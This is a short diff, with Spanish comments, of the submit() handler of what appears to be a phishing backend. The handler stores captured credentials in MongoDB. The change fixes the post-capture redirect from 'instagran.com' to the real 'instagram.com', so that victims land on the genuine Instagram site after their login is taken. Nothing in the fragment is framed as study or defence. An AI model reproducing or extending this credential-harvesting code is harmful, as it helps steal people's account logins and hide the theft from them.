@@ -37,7 +37,7 @@ def submit():
         logger.info("Datos almacenados correctamente en MongoDB.")
         
         #return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
-        return redirect("https://instagran.com")
+        return redirect("https://instagram.com")
     except Exception as e:
         logger.error(f"Error al almacenar credenciales: {e}")
         return jsonify({"error": str(e)}), 500
